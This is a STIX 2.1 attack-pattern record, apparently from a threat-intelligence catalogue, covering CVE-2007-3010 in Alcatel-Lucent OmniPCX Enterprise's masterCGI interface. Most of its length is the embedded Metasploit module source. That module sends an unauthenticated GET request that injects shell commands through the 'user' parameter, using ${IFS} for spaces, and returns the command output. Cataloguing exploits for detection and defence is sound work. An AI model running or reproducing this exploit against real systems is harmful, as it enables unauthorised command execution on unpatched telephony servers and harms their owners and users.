{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6b450730-ce6f-4cbc-a06c-14d0d2dd705c",
    "created": "2024-08-14T17:01:42.898885Z",
    "modified": "2024-08-14T17:01:42.898889Z",
    "name": "Alcatel-Lucent OmniPCX Enterprise masterCGI Arbitrary Command Execution",
    "description": " This module abuses a metacharacter injection vulnerability in the HTTP management interface of the Alcatel-Lucent OmniPCX Enterprise Communication Server 7.1 and earlier. The Unified Maintenance Tool contains a 'masterCGI' binary which allows an unauthenticated attacker to execute arbitrary commands by specifying shell metacharaters as the 'user' within the 'ping' action to obtain 'httpd' user access. This module only supports command line payloads, as the httpd process kills the reverse/bind shell spawn after the HTTP 200 OK response. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/alcatel_omnipcx_mastercgi_exec.rb",
            "external_id": "alcatel_omnipcx_mastercgi_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-3010"
        },
        {
            "source_name": "reference",
            "url": "http://www1.alcatel-lucent.com/psirt/statements/2007002/OXEUMT.htm"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking # Only interactive single commands supported\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Alcatel-Lucent OmniPCX Enterprise masterCGI Arbitrary Command Execution',\n      'Description'    => %q{\n          This module abuses a metacharacter injection vulnerability in the\n        HTTP management interface of the Alcatel-Lucent OmniPCX Enterprise\n        Communication Server 7.1 and earlier. The Unified Maintenance Tool\n        contains a 'masterCGI' binary which allows an unauthenticated attacker\n        to execute arbitrary commands by specifying shell metacharaters as the\n        'user' within the 'ping' action to obtain 'httpd' user access. This\n        module only supports command line payloads, as the httpd process kills\n        the reverse/bind shell spawn after the HTTP 200 OK response.\n      },\n      'Author'         => [ 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '40521' ],\n          [ 'BID', '25694' ],\n          [ 'CVE', '2007-3010' ],\n          [ 'URL', 'http://www1.alcatel-lucent.com/psirt/statements/2007002/OXEUMT.htm' ],\n        ],\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic'\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic Target', { }]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2007-09-09'))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n      ])\n  end\n\n  def exploit\n    connect\n\n    cmd = payload.encoded.gsub(\" \", '${IFS}')\n    req =\n      \"GET /cgi-bin/masterCGI?ping=nomip&user=;#{cmd}; HTTP/1.1\\r\\n\" +\n      \"Host: #{rhost}\\r\\n\\r\\n\"\n\n    print_status(\"Sending GET request with command line payload...\")\n    sock.put(req)\n\n    res = sock.get_once(-1, 5)\n\n    if (res =~ /<h5>(.*)<\\/h5>/smi)\n      out = $1\n      print_line(out.gsub(/<h5>|<\\/h5>/, ''))\n      return\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-09-09",
    "x_mitre_platforms": [
        "['unix']"
    ]
}